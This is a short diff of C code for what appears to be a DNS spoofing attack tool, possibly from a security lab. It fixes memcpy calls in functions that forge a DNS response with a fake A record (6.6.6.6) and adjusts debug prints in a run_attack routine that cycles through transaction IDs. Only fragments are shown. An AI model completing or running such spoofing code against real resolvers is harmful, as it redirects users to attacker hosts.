@@ -27,7 +27,7 @@ int build_dns_response(unsigned char *buffer, unsigned char *query, int query_le
     unsigned short add_count = 0;
 
     // Copy the query into the buffer
-    memcpy(buffer, query, sizeof(int) * query_len);
+    memcpy(buffer, query, query_len);
     response_len = query_len;
 
     // Header section for response
@@ -46,7 +46,7 @@ int build_dns_response(unsigned char *buffer, unsigned char *query, int query_le
 
     // Copy the question section as is (hostname format and type)
     // This is the same question section as in the query, no changes
-    memcpy(buffer + response_len, (query + 12)sizeof(int), query_len - 12);
+    memcpy(buffer + response_len, (query + 12), query_len - 12);
     response_len += query_len - 12;
 
     // Answer section: Hostname -> A record (IP: 6.6.6.6)
@@ -187,6 +187,7 @@ void run_attack(uint32_t *txid_ls) {
     // Step 3: Build the DNS query
     int query_len = build_dns_query(buffer, hostname);
     printf("step 3 done\n");
+    printf("buffer: %s\n", buffer);
     // Step 4: Send the DNS query
     if (sendto(sockfd, buffer, query_len, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
         perror("Failed to send DNS query");
@@ -262,7 +263,6 @@ int build_dns_query(unsigned char *buffer, const char *hostname) {
         memcpy(buffer + query_len, token, len);
         query_len += len;
         token = strtok(NULL, ".");
-        printf("got here \n");
     }
 
     buffer[query_len++] = 0; // End of hostname
